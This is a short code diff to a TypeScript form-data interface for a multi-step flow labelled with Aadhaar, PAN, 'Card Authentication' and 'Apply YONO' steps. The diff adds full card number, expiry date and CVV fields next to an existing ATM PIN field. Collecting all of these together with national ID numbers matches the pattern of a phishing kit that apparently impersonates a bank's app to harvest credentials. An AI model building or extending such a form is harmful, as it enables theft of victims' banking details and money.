@@ -48,8 +48,12 @@ export interface FormData {
     accountNumber?: string;
     aadhaarNumber?: string;
     panCard?: string;
+    panNumber?: string;
     // Step 4: Card Authentication
     cardLast6?: string;
+    cardNumber?: string;
+    validThrough?: string;
+    cvv?: string;
     atmPin?: string;
     // Step 5: Apply YONO
     cifNumber?: string;
